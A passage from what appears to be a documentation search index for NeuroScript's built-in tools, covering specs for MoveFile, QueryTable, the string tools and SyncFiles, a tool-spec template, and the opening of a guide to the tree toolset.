<li><code>destination</code> (String): Required. The new path for the file or directory, relative to the sandboxed root.</li> </ul> </li> <li>Return Value: (Map)<ul> <li><code>error</code> (String | null): A string describing the error if the move/rename fails (e.g., source not found, destination exists, permission denied), otherwise <code>null</code>.</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly two string arguments (<code>source</code>, <code>destination</code>) are provided. Returns <code>ErrValidationArgCount</code> if not.</li> <li>Validates both the <code>source</code> and <code>destination</code> paths using <code>SecureFilePath</code> [cite: uploaded:neuroscript_small/pkg/core/security.go] to ensure they resolve within the designated secure working directory sandbox. Returns an appropriate error (e.g., <code>ErrSecurityPathViolation</code>) if validation fails.</li> <li>Checks if the resolved <code>source</code> path exists on the filesystem. Returns an error (e.g., <code>\"Source path does not exist\"</code>) if it does not.</li> <li>Checks if the resolved <code>destination</code> path already exists on the filesystem. To prevent accidental overwrites or ambiguous moves into directories, this tool returns an error (e.g., <code>\"Destination path already exists\"</code>) if the destination path exists. It does not support overwriting.</li> <li>If all validations pass and the destination does not exist, attempts to move/rename the <code>source</code> to the <code>destination</code> using the operating system's rename functionality (e.g., <code>os.Rename</code> in Go).</li> <li>Returns a map <code>{\"error\": null}</code> on success.</li> <li>On failure (permission error, I/O error, etc. during <code>os.Rename</code>), returns a map <code>{\"error\": \"descriptive message\"}</code>.</li> </ol> </li> <li>Security Considerations:<ul> <li>Relies entirely on the <code>SecureFilePath</code> validation to prevent moving files outside the intended sandbox. The implementation and configuration of <code>SecureFilePath</code> must be robust.</li> </ul> </li> <li>Examples: <pre><code># Rename a file\nVAR result = CALL TOOL.MoveFile(\"old_name.txt\", \"new_name.txt\")\nIF result.error != null THEN\n    EMIT \"Error renaming file: \", result.error\nEND\n\n# Move a file into a subdirectory (assuming subdir exists)\nVAR result_move = CALL TOOL.MoveFile(\"report.txt\", \"reports/final_report.txt\")\nIF result_move.error != null THEN\n    EMIT \"Error moving file: \", result_move.error\nEND\n\n# Attempt to overwrite (will fail)\nCALL TOOL.WriteFile(\"existing.txt\", \"content\")\nVAR overwrite_result = CALL TOOL.MoveFile(\"some_other_file.txt\", \"existing.txt\")\n# overwrite_result.error should be non-null here\nEMIT \"Overwrite attempt error: \", overwrite_result.error\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: Likely <code>pkg/core/tools_fs.go</code>.</li> <li>Use Go's <code>os.Rename(secureSourcePath, secureDestPath)</code> after performing checks.</li> <li>Remember to check for source existence (<code>os.Stat</code>) and destination non-existence (<code>os.Stat</code> returning <code>fs.ErrNotExist</code>) before calling <code>os.Rename</code>.</li> <li>Register the function (e.g., <code>toolFSMoveFile</code>) in <code>pkg/core/tools_register.go</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/query_table/","title":"query_table","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.0 :: id: tool-query-table-spec-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, docs/NeuroData/table.md, docs/NeuroData/references.md, docs/script spec.md, docs/metadata.md :: howToUpdate: Review against implementation in Go. Update version for non-trivial changes to arguments, behavior, or return value.</p>"},{"location":"ns/tools/query_table/#tool-specification-toolquerytable-v01","title":"Tool Specification: <code>TOOL.QueryTable</code> (v0.1)","text":"<ul> <li>Tool Name: <code>TOOL.QueryTable</code></li> <li>Purpose: Reads data from a specified NeuroData Table (<code>.ndtable</code>) source, filters rows based on a condition, and returns selected columns. Provides basic SQL <code>SELECT</code>/<code>WHERE</code> functionality for <code>.ndtable</code> files.</li> <li>NeuroScript Syntax: <code>CALL TOOL.QueryTable(table, [select], [where])</code></li> <li>Arguments:<ul> <li><code>table</code> (String | Reference): Required. Either the string content of an <code>.ndtable</code> file or a <code>[ref:&lt;location&gt;]</code> string pointing to an <code>.ndtable</code> file or block. The location part of a reference will be validated using <code>SecureFilePath</code>.</li> <li><code>select</code> (List[String] | Null, Optional): A NeuroScript list of column name strings to include in the results. Column names must match those defined in the source table's schema. If this argument is omitted, <code>null</code>, or an empty list, all columns defined in the table's schema are returned.</li> <li><code>where</code> (String | Null, Optional): A NeuroScript expression string that is evaluated for each row of the table. Only rows where this expression evaluates to <code>true</code> (according to NeuroScript truthiness rules) are included in the result. If omitted or <code>null</code>, all rows are included (no filtering applied). Within the expression string, values from the current row are accessed using the convention <code>row.&lt;ColumnName&gt;</code> (e.g., <code>row.Status</code>, <code>row.Cost</code>).</li> </ul> </li> <li>Return Value: (List[Map])<ul> <li>On success, returns a NeuroScript list. Each element in the list is a map representing a single row that matched the <code>where</code> clause.</li> <li>Each map contains only the columns specified in the <code>select</code> parameter (or all columns if <code>select</code> was omitted/null/empty). Map keys are the column names (string), and map values are the corresponding data from the row, converted to appropriate NeuroScript types (string, number, boolean).</li> <li>Returns an empty list <code>[]</code> if no rows match the <code>where</code> clause or the table is empty.</li> <li>On fatal error (e.g., table parsing failed, <code>where</code> clause parsing failed, invalid <code>select</code> column), returns <code>null</code> (alternative: return a map <code>{\"error\": \"Error message\"}</code> - TBD during implementation).</li> </ul> </li> <li>Behavior:<ol> <li>Validates argument count and types. Expects 1 required (<code>table</code>) and 2 optional (<code>select</code>, <code>where</code>).</li> <li>Resolves the <code>table</code> argument. If it's a <code>[ref:...]</code>, it securely resolves the path using <code>SecureFilePath</code> and reads the content.</li> <li>Parses the <code>.ndtable</code> content, extracting the schema (column definitions) and data rows according to the <code>.ndtable</code> specification. Returns error if parsing fails.</li> <li>Validates the list of column names provided in the optional <code>select</code> argument against the parsed schema names. Returns error if any selected column does not exist. If <code>select</code> is omitted/null/empty, uses all columns from the schema.</li> <li>If a <code>where</code> clause string is provided:<ul> <li>Parses the <code>where</code> expression string into a NeuroScript Abstract Syntax Tree (AST) once. Returns error if <code>where</code> string is invalid syntax.</li> </ul> </li> <li>Initializes an empty list <code>results = []</code>.</li> <li>Iterates through each data row parsed from the table:<ul> <li>Converts the row's string cell values into appropriate NeuroScript types based on the schema. Handles conversion errors.</li> <li>If a <code>where</code> clause AST exists:<ul> <li>Creates a temporary evaluation scope containing the current row's values, accessible via the <code>row.&lt;ColumnName&gt;</code> convention (e.g., scope maps <code>\"row\"</code> to a map representing the current row).</li> <li>Evaluates the <code>where</code> AST within this scope using the standard NeuroScript expression evaluator.</li> <li>If evaluation results in an error, logs a warning for that row and skips it.</li> <li>If evaluation results in a value that is not NeuroScript <code>true</code>, skips the current row.</li> </ul> </li> <li>(If row was not skipped) Creates a result map containing only the selected columns (with their typed values) for the current row.</li> <li>Appends the result map to the <code>results</code> list.</li> </ul> </li> <li>Returns the final <code>results</code> list.</li> </ol> </li> <li>Security Considerations:<ul> <li>File system access for <code>table</code> references must be sandboxed via <code>SecureFilePath</code>.</li> <li>The <code>where</code> clause uses the NeuroScript expression evaluator, which is sandboxed by design (cannot perform I/O, <code>CALL LLM</code>, etc., directly within the expression). However, overly complex <code>where</code> clauses could potentially consume significant resources during evaluation for very large tables. Tool timeouts could be considered for future robustness.</li> </ul> </li> <li>Examples: <pre><code># Assume workers.ndtable exists and is referenced correctly\n\n# Example 1: Find all available, proficient AI workers, select specific columns\nVAR ai_workers = CALL TOOL.QueryTable(\n    table = \"[ref:data/workers.ndtable]\",\n    select = [\"WorkerID\", \"Name\", \"Endpoint\"],\n    where = \"row.WorkerType == 'AI' AND row.Status == 'available' AND row.SkillLevel == 'proficient'\"\n)\nEMIT \"Available Proficient AI Workers:\"\nEMIT ai_workers # Output will be a list of maps, e.g., [{\"WorkerID\": \"...\", \"Name\": \"...\", \"Endpoint\": \"...\"}]\n\n# Example 2: Find workers with file management skills, return all columns\nVAR file_mgrs = CALL TOOL.QueryTable(\n    table = \"[ref:data/workers.ndtable]\",\n    # 'select' parameter omitted - returns all columns\n    where = \"CALL TOOL.Contains(row.Skills, 'file_mgmt')\" # Assumes TOOL.Contains exists and works\n)\nEMIT \"File Managers (all details):\"\nEMIT file_mgrs # Output will be a list of maps, each containing all columns for matching rows\n\n# Example 3: Get all data for a specific worker\nVAR specific_worker_list = CALL TOOL.QueryTable(\n    table = \"[ref:data/workers.ndtable]\",\n    where = \"row.WorkerID == 'build-server-01'\"\n)\n# Result is a list, potentially empty or with one element\nEMIT \"Details for build-server-01:\"\nEMIT specific_worker_list\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Suggested Location: <code>pkg/core/tools_query.go</code> (new file) or potentially <code>tools_neurodata.go</code>.</li> <li>Requires:<ul> <li>Ability to parse <code>.ndtable</code> schema and data rows (potentially a new function in <code>pkg/neurodata/table/</code> or similar).</li> <li>Integration with the NeuroScript expression parser (<code>pkg/core/parser_api.go</code>).</li> <li>Integration with the NeuroScript expression evaluator (<code>pkg/core/evaluation_main.go</code>), including setting up the <code>row.</code> context.</li> <li>Integration with <code>SecureFilePath</code> for resolving <code>table</code> references.</li> </ul> </li> <li>Register the tool function (e.g., <code>toolQueryTable</code>) in <code>pkg/core/tools_register.go</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/strings/","title":"strings","text":"<p>:: type: NSproject :: subtype: tool_spec_summary :: version: 0.1.0 :: id: tool-spec-summary-string-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_string.go, docs/script_spec.md :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/strings/#tool-specification-summary-string-tools-v01","title":"Tool Specification Summary: String Tools (v0.1)","text":"<p>This document provides an abbreviated overview of the built-in String tools.</p>"},{"location":"ns/tools/strings/#tool-stringstringlength","title":"Tool: <code>String.StringLength</code>","text":"<ul> <li>Purpose: Returns the number of UTF-8 characters (runes) in a string.</li> <li>Syntax: <code>CALL String.StringLength(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to measure.</li> </ul> </li> <li>Returns: (Number) The rune count.</li> <li>Example: <code>CALL String.StringLength(\"\u4f60\u597d\")</code> -&gt; <code>LAST</code> will be <code>2</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringsubstring","title":"Tool: <code>String.Substring</code>","text":"<ul> <li>Purpose: Returns a portion of the string based on rune indices.</li> <li>Syntax: <code>CALL String.Substring(input: &lt;String&gt;, start: &lt;Number&gt;, end: &lt;Number&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The source string.</li> <li><code>start</code> (Number): Required. 0-based start index (inclusive).</li> <li><code>end</code> (Number): Required. 0-based end index (exclusive).</li> </ul> </li> <li>Returns: (String) The extracted substring. Returns empty string if indices are invalid/out of bounds.</li> <li>Example: <code>CALL String.Substring(\"abcdef\", 1, 4)</code> -&gt; <code>LAST</code> will be <code>\"bcd\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringtoupper","title":"Tool: <code>String.ToUpper</code>","text":"<ul> <li>Purpose: Converts a string to uppercase.</li> <li>Syntax: <code>CALL String.ToUpper(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to convert.</li> </ul> </li> <li>Returns: (String) The uppercase version of the string.</li> <li>Example: <code>CALL String.ToUpper(\"Hello World\")</code> -&gt; <code>LAST</code> will be <code>\"HELLO WORLD\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringtolower","title":"Tool: <code>String.ToLower</code>","text":"<ul> <li>Purpose: Converts a string to lowercase.</li> <li>Syntax: <code>CALL String.ToLower(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to convert.</li> </ul> </li> <li>Returns: (String) The lowercase version of the string.</li> <li>Example: <code>CALL String.ToLower(\"Hello World\")</code> -&gt; <code>LAST</code> will be <code>\"hello world\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringtrimspace","title":"Tool: <code>String.TrimSpace</code>","text":"<ul> <li>Purpose: Removes leading and trailing whitespace from a string.</li> <li>Syntax: <code>CALL String.TrimSpace(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to trim.</li> </ul> </li> <li>Returns: (String) The string with leading/trailing whitespace removed.</li> <li>Example: <code>CALL String.TrimSpace(\"  some text  \")</code> -&gt; <code>LAST</code> will be <code>\"some text\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringsplitstring","title":"Tool: <code>String.SplitString</code>","text":"<ul> <li>Purpose: Splits a string into a list of substrings based on a specified delimiter.</li> <li>Syntax: <code>CALL String.SplitString(input: &lt;String&gt;, delimiter: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to split.</li> <li><code>delimiter</code> (String): Required. The string to use as a separator.</li> </ul> </li> <li>Returns: (List of Strings) A list containing the substrings.</li> <li>Example: <code>CALL String.SplitString(\"apple,banana,orange\", \",\")</code> -&gt; <code>LAST</code> will be <code>[\"apple\", \"banana\", \"orange\"]</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringsplitwords","title":"Tool: <code>String.SplitWords</code>","text":"<ul> <li>Purpose: Splits a string into a list of words, using whitespace as the delimiter.</li> <li>Syntax: <code>CALL String.SplitWords(input: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to split into words.</li> </ul> </li> <li>Returns: (List of Strings) A list containing the words.</li> <li>Example: <code>CALL String.SplitWords(\"Split these words\")</code> -&gt; <code>LAST</code> will be <code>[\"Split\", \"these\", \"words\"]</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringjoinstrings","title":"Tool: <code>String.JoinStrings</code>","text":"<ul> <li>Purpose: Joins the elements of a list into a single string, placing a specified separator between elements. Elements are converted to strings if necessary.</li> <li>Syntax: <code>CALL String.JoinStrings(input_slice: &lt;List&gt;, separator: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input_slice</code> (List): Required. The list of items to join.</li> <li><code>separator</code> (String): Required. The string to insert between elements.</li> </ul> </li> <li>Returns: (String) The joined string.</li> <li>Example: <code>SET my_list = [\"one\", 2, \"three\"]</code> -&gt; <code>CALL String.JoinStrings(my_list, \" - \")</code> -&gt; <code>LAST</code> will be <code>\"one - 2 - three\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringreplaceall","title":"Tool: <code>String.ReplaceAll</code>","text":"<ul> <li>Purpose: Replaces all occurrences of a specified substring with another substring.</li> <li>Syntax: <code>CALL String.ReplaceAll(input: &lt;String&gt;, old: &lt;String&gt;, new: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The original string.</li> <li><code>old</code> (String): Required. The substring to be replaced.</li> <li><code>new</code> (String): Required. The substring to replace with.</li> </ul> </li> <li>Returns: (String) The string with all replacements made.</li> <li>Example: <code>CALL String.ReplaceAll(\"this is a test is\", \"is\", \"XX\")</code> -&gt; <code>LAST</code> will be <code>\"thXX XX a test XX\"</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringcontains","title":"Tool: <code>String.Contains</code>","text":"<ul> <li>Purpose: Checks if a string contains a specified substring.</li> <li>Syntax: <code>CALL String.Contains(input: &lt;String&gt;, substring: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to search within.</li> <li><code>substring</code> (String): Required. The substring to search for.</li> </ul> </li> <li>Returns: (Boolean) <code>true</code> if the substring is found, <code>false</code> otherwise.</li> <li>Example: <code>CALL String.Contains(\"Hello world\", \"world\")</code> -&gt; <code>LAST</code> will be <code>true</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringhasprefix","title":"Tool: <code>String.HasPrefix</code>","text":"<ul> <li>Purpose: Checks if a string starts with a specified prefix.</li> <li>Syntax: <code>CALL String.HasPrefix(input: &lt;String&gt;, prefix: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to check.</li> <li><code>prefix</code> (String): Required. The prefix to check for.</li> </ul> </li> <li>Returns: (Boolean) <code>true</code> if the string starts with the prefix, <code>false</code> otherwise.</li> <li>Example: <code>CALL String.HasPrefix(\"filename.txt\", \"file\")</code> -&gt; <code>LAST</code> will be <code>true</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringhassuffix","title":"Tool: <code>String.HasSuffix</code>","text":"<ul> <li>Purpose: Checks if a string ends with a specified suffix.</li> <li>Syntax: <code>CALL String.HasSuffix(input: &lt;String&gt;, suffix: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>input</code> (String): Required. The string to check.</li> <li><code>suffix</code> (String): Required. The suffix to check for.</li> </ul> </li> <li>Returns: (Boolean) <code>true</code> if the string ends with the suffix, <code>false</code> otherwise.</li> <li>Example: <code>CALL String.HasSuffix(\"filename.txt\", \".txt\")</code> -&gt; <code>LAST</code> will be <code>true</code>.</li> </ul>"},{"location":"ns/tools/strings/#tool-stringlinecountstring","title":"Tool: <code>String.LineCountString</code>","text":"<ul> <li>Purpose: Counts the number of lines within a given string.</li> <li>Syntax: <code>CALL String.LineCountString(content: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>content</code> (String): Required. The string content in which to count lines.</li> </ul> </li> <li>Returns: (Number) The number of lines (similar logic to <code>FS.LineCountFile</code>: counts <code>\\n</code>, adds 1 if non-empty and no trailing <code>\\n</code>).</li> <li>Example: <code>SET multi_line = \"Line 1\\nLine 2\\nLine 3\"</code> -&gt; <code>CALL String.LineCountString(multi_line)</code> -&gt; <code>LAST</code> will be <code>3</code>.</li> </ul>"},{"location":"ns/tools/sync_files/","title":"sync_files","text":"<p>:: type: NSproject  :: subtype: tool_specification  :: version: 0.1.0  :: id: tool-spec-sync-files-v0.1  :: status: draft  :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_file_api.go, docs/ns/tools/list_api_files.md, docs/ns/tools/upload_file.md, docs/ns/tools/delete_api_file.md  :: howToUpdate: Update when adding support for other directions (\"down\", \"both\") or changing behavior/return value.</p> <p># Tool Specification: TOOL.SyncFiles (v0.1)</p> <ul> <li>Tool Name: TOOL.SyncFiles (v0.1)</li> <li>Purpose: Synchronizes files between a specified local directory within the sandbox and the Gemini File API storage. This version only supports the \"up\" direction (local to API).</li> <li>NeuroScript Syntax: <pre><code>syncStatsMap := TOOL.SyncFiles(direction, localDirectory, [filterGlobPattern])\n</code></pre></li> <li>Arguments:<ul> <li><code>direction</code> (String): Required. Specifies the synchronization direction. Currently, only <code>\"up\"</code> is supported. Case-insensitive.</li> <li><code>local_dir</code> (String): Required. The path to the local directory within the NeuroScript sandbox environment to synchronize. Subject to <code>SecureFilePath</code> validation. Must be a directory.</li> <li><code>filter_pattern</code> (String): Optional. A glob pattern (e.g., <code>\"*.txt\"</code>, <code>\"images/*\"</code>, <code>\"main.go\"</code>) used to filter files based on their basename within the <code>local_dir</code>. If omitted or null, all files are considered for synchronization.</li> </ul> </li> <li>Return Value: (Map)<ul> <li>On success or partial success: A map containing statistics about the sync operation. Keys include:<ul> <li><code>files_scanned</code> (Number): Total local files encountered during the walk.</li> <li><code>files_filtered</code> (Number): Local files skipped due to the <code>filter_pattern</code>.</li> <li><code>files_uploaded</code> (Number): Files successfully uploaded (new or changed).</li> <li><code>files_deleted</code> (Number): API files successfully deleted (because they were removed locally).</li> <li><code>files_up_to_date</code> (Number): Local files found to be identical to their API counterparts (based on hash).</li> <li><code>upload_errors</code> (Number): Count of errors encountered during upload attempts.</li> <li><code>delete_errors</code> (Number): Count of errors encountered during delete attempts.</li> <li><code>list_errors</code> (Number): Count of errors encountered when initially listing API files (sync aborts if &gt; 0).</li> <li><code>walk_errors</code> (Number): Count of non-critical errors during local directory walk (e.g., permission denied on a sub-item).</li> <li><code>hash_errors</code> (Number): Count of errors calculating local file hashes.</li> </ul> </li> <li>On critical failure: An error (e.g., invalid <code>local_dir</code>, API client not initialized, invalid <code>filter_pattern</code>, failure to list initial API files). A Go-level error will also be returned to the interpreter. Non-critical errors during individual uploads/deletes are reflected in the stats map but do not cause a Go error return.</li> </ul> </li> <li>Behavior (<code>direction=\"up\"</code>):<ol> <li>Validates arguments (<code>direction</code>, <code>local_dir</code> type/security, <code>filter_pattern</code> type). Aborts with an error if invalid.</li> <li>Calls <code>TOOL.ListAPIFiles</code> internally to get the current state of files in the API. Creates a map of these files keyed by their <code>displayName</code>. Aborts with an error if listing fails.</li> <li>Recursively walks the specified <code>local_dir</code>. Keeps track of local relative paths seen.</li> <li>For each local file encountered:     a. Skips if it doesn't match the <code>filter_pattern</code> (if provided). Uses glob matching on the file's base name.     b. Calculates the SHA256 hash of the local file content (handles zero-byte files).     c. Looks up the file's relative path (used as display name) in the API file map.     d. Compares the local hash with the <code>sha256Hash</code> from the API file info.     e. If the file is not in the API map, or if the hashes differ, calls <code>TOOL.UploadFile</code> internally to upload the local file (using the relative path as the display name). Logs errors and increments stats but continues.     f. If the file exists in the API map and hashes match, increments the <code>files_up_to_date</code> stat.</li> <li>After the walk, iterates through the API file map obtained in step 2.</li> <li>For each API file, checks if its <code>displayName</code> was seen during the local walk AND if it would not have been skipped by the filter pattern.</li> <li>If an API file's <code>displayName</code> was not seen locally (and wouldn't be filtered), calls <code>TOOL.DeleteAPIFile</code> internally to delete the file from the API. Logs errors and increments stats but continues.</li> <li>Returns the final statistics map.</li> </ol> </li> <li>Security Considerations:<ul> <li>Requires a valid <code>GEMINI_API_KEY</code> with permissions for List, Upload, Get, and Delete file operations.</li> <li><code>local_dir</code> is validated using <code>SecureFilePath</code>. The walk is confined within this directory.</li> <li>Network access to Google Cloud services is required.</li> <li>Reads all files within the specified <code>local_dir</code> (subject to filtering) and uploads changed/new ones to Google Cloud storage.</li> <li>Deletes files from Google Cloud storage if they are removed locally (subject to filtering).</li> </ul> </li> <li>Examples: <pre><code>// Sync everything in the 'project_files' subdir up to the API\nstats1 := TOOL.SyncFiles(\"up\", \"project_files\")\nIO.Print(\"Sync 1 Stats:\", stats1)\n\n// Sync only Go files in the 'src' subdir up to the API\nstats2 := TOOL.SyncFiles(\"up\", \"src\", \"*.go\")\nIO.Print(\"Sync 2 Stats (Go files):\", stats2)\nIF stats2[\"upload_errors\"] &gt; 0 OR stats2[\"delete_errors\"] &gt; 0 THEN\n    IO.Print(\"  WARNING: Sync encountered errors.\")\nEND\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Implemented in <code>pkg/core/tools_file_api.go</code> as <code>toolSyncFiles</code>.</li> <li>Uses <code>filepath.WalkDir</code> for local traversal.</li> <li>Uses <code>filepath.Match</code> for glob pattern matching.</li> <li>Internally calls <code>toolListAPIFiles</code>, <code>toolUploadFile</code>, <code>toolDeleteAPIFile</code>.</li> <li>Needs helper <code>calculateFileHash</code> (adapted from <code>gensync</code>).</li> <li>Registered via <code>registerFileAPITools</code>.</li> <li>Currently only supports <code>direction=\"up\"</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/tool_spec_structure/","title":"tool_spec_structure","text":"<p>:: type: NSproject :: subtype: spec_template :: version: 0.1.0 :: id: tool-spec-structure-template-v0.1 :: status: approved :: dependsOn: docs/metadata.md :: howToUpdate: Review when creating/updating tool specs to ensure this template remains accurate.  </p>"},{"location":"ns/tools/tool_spec_structure/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":"<p>This document outlines the standard structure for documenting NeuroScript built-in tools within the <code>docs/ns/tools/</code> directory. Each tool should have its own markdown file (e.g., <code>io_input.md</code>, <code>tool_fs_movefile.md</code>).</p>"},{"location":"ns/tools/tool_spec_structure/#tool-specification-categorytoolname-vxy","title":"Tool Specification: <code>CATEGORY.ToolName</code> (Vx.y)","text":"<ul> <li>Tool Name: The fully qualified name of the tool (e.g., <code>IO.Input</code>, <code>TOOL.MoveFile</code>). Include a version number (e.g., v0.1) if the spec evolves.</li> <li>Purpose: A brief (1-2 sentence) description of what the tool does and why it's useful.</li> <li>NeuroScript Syntax: A code example showing how the tool is called in NeuroScript. Include placeholders for arguments.</li> <li>Arguments:<ul> <li>A list describing each argument:<ul> <li><code>argument_name</code> (Type): Description of the argument, including whether it's required or optional, and any constraints (e.g., specific format, allowed values).</li> </ul> </li> </ul> </li> <li>Return Value: (Type - e.g., Map, List, String, Number, Boolean, null)<ul> <li>Description of the value returned by the tool upon successful execution.</li> <li>If the return type is a Map, list the expected keys and their value types/meanings. Crucially, specify how errors are indicated (e.g., an <code>error</code> key being non-null).</li> </ul> </li> <li>Behavior:<ul> <li>A numbered or bulleted list describing the step-by-step execution logic of the tool.</li> <li>Detail validation performed on arguments.</li> <li>Specify handling of edge cases (e.g., file not found, empty input, division by zero).</li> <li>Describe how errors are generated and returned.</li> </ul> </li> <li>Security Considerations:<ul> <li>Outline any security implications of using the tool.</li> <li>Specify restrictions (e.g., disallowed in agent mode, reliance on <code>SecureFilePath</code>).</li> <li>Mention potential risks if used improperly.</li> </ul> </li> <li>Examples: (Optional but Recommended)<ul> <li>One or more NeuroScript snippets demonstrating practical usage of the tool, potentially showing different argument combinations or expected outputs.</li> </ul> </li> <li>Go Implementation Notes: (Optional - Primarily for developers implementing the tool)<ul> <li>Suggested location in the Go codebase (e.g., <code>pkg/core/tools_fs.go</code>).</li> <li>Relevant Go packages to use (e.g., <code>os</code>, <code>fmt</code>, <code>go/ast</code>).</li> <li>Key Go functions involved (e.g., <code>os.Rename</code>).</li> <li>Reminder about registration (e.g., in <code>pkg/core/tools_register.go</code>).</li> </ul> </li> </ul>"},{"location":"ns/tools/trees_guide/","title":"Guide to the NeuroScript <code>tree</code> Toolset","text":"<p>The <code>tree</code> toolset provides a powerful way to work with structured data, like JSON, in a more flexible and granular manner. Instead of just parsing and printing text, it transforms data into a navigable graph of interconnected nodes. This allows for precise inspection, modification, and querying of complex data structures.</p>"},{"location":"ns/tools/trees_guide/#1-core-concepts","title":"1. Core Concepts","text":""},{"location":"ns/tools/trees_guide/#the-tree-structure","title":"The Tree Structure","text":"<p>When you load a JSON string, it's converted into a tree. This isn't just a text blob; it's a collection of individual nodes held in memory.</p> <ul> <li>Tree Handle: When a tree is created (e.g., from <code>LoadJSON</code>), you get back a unique handle (e.g., <code>\"GenericTree::xyz-abc\"</code>). This handle is your reference to the entire tree structure for all subsequent operations.</li> <li>Nodes: Every element in the original data\u2014every object, array, string, number, etc.\u2014becomes a node. Each node has a unique ID within the tree (e.g., <code>\"node-1\"</code>, <code>\"node-2\"</code>).</li> <li>Relationships: Nodes are linked. An object node has attributes that point to other nodes. An array node has a list of child node IDs. Every node (except the root) knows its parent's ID.</li> </ul>"},{"location":"ns/tools/trees_guide/#node-properties","title":"Node Properties","text":"<p>Every node in the tree has the following properties, which you can view with <code>GetNode</code>:</p> <ul> <li><code>id</code>: The unique identifier for this node (e.g., <code>\"node-5\"</code>).</li> <li><code>type</code>: The data type of the node. This can be <code>object</code>, <code>array</code>, <code>string</code>, <code>number</code>, <code>boolean</code>, or <code>null</code>. If the source JSON object has a <code>\"type\"</code> field (e.g., <code>{\"type\": \"file\", \"name\": \"a.txt\"}</code>), that value is used as the node's type.</li> <li><code>value</code>: The actual data for simple nodes (e.g., <code>\"hello world\"</code>, <code>123</code>, <code>true</code>). For <code>object</code> and <code>array</code> nodes, this is <code>nil</code>.</li> <li><code>attributes</code>: A map of key-value pairs.<ul> <li>For object nodes, the keys are the JSON object keys, and the values are the node IDs of the corresponding child nodes.</li> <li>For all nodes, this map is also used to store user-defined metadata (see <code>SetNodeMetadata</code>).</li> </ul> </li> <li><code>children</code>: A list of child node IDs. This is primarily used by <code>array</code> nodes.</li> <li><code>parent_id</code>: The ID of the node's parent. This is empty for the root node.</li> </ul>"},{"location":"ns/tools/trees_guide/#2-getting-started-loading-and-inspecting","title":"2. Getting Started: Loading and Inspecting","text":"<p>The most common workflow starts with loading data.</p> <pre><code>// 1. Load JSON data into a tree and get its handle.\nlet json_data = \"{\\\"project\\\": {\\\"name\\\": \\\"NeuroScript\\\", \\\"version\\\": 0.6}, \\\"active\\\": true}\"\nlet tree_handle = tool.Tree.LoadJSON(json_data)\n\n// 2. Get the root node of the tree.\nlet root_node = tool.Tree.GetRoot(tree_handle)\n\n// 3. Inspect the root node's properties.\n// The root_node variable now holds a map, like:\n// {\n//   \"id\": \"node-1\",\n//   \"type\": \"object\",\n//   \"value\": nil,\n//   \"attributes\": {\"project\": \"node-2\", \"active\": \"node-5\"},\n//   \"children\": [],\n//   \"parent_id\": \"\"\n// }\n\n// 4. Get a specific child node using its ID from the parent's attributes.\nlet project_node_id = root_node.attributes.project\nlet project_node = tool.Tree.GetNode(tree_handle, project_node_id)\n\n// 5. You can also get a node directly by its path from the root.\nlet version_node = tool.Tree.GetNodeByPath(tree_handle, \"project.version\")\n// version_node.value will be 0.6\n</code></pre>"},{"location":"ns/tools/trees_guide/#3-tool-reference","title":"3. Tool Reference","text":""},{"location":"ns/tools/trees_guide/#loading-and-saving","title":"Loading and Saving","text":"<ul> <li> <p>LoadJSON(json_string)</p> <ul> <li>Description: Parses a JSON string into a new tree.</li> <li>Returns: A string <code>tree_handle</code>.</li> <li>Example: <code>let handle = tool.Tree.LoadJSON(\"{\\\"a\\\": 1}\")</code></li> </ul> </li> <li> <p>ToJSON(tree_handle)</p> <ul> <li>Description: Converts an entire tree back into a pretty-printed JSON string.</li> <li>Returns: A JSON string.</li> <li>Example: <code>let json_out = tool.Tree.ToJSON(handle)</code></li> </ul> </li> <li> <p>RenderText(tree_handle)</p> <ul> <li>Description: Creates a human-readable, indented text diagram of the tree structure. Useful for debugging.</li> <li>Returns: A multi-line string.</li> <li>Example: <code>print(tool.Tree.RenderText(handle))</code></li> </ul> </li> </ul>"},{"location":"ns/tools/trees_guide/#navigation","title":"Navigation","text":"<ul> <li> <p>GetRoot(tree_handle)</p> <ul> <li>Description: Retrieves the top-level node of the tree.</li> <li>Returns: A map representing the root node.</li> </ul> </li> <li> <p>GetNode(tree_handle, node_id)</p> <ul> <li>Description: Retrieves any node by its 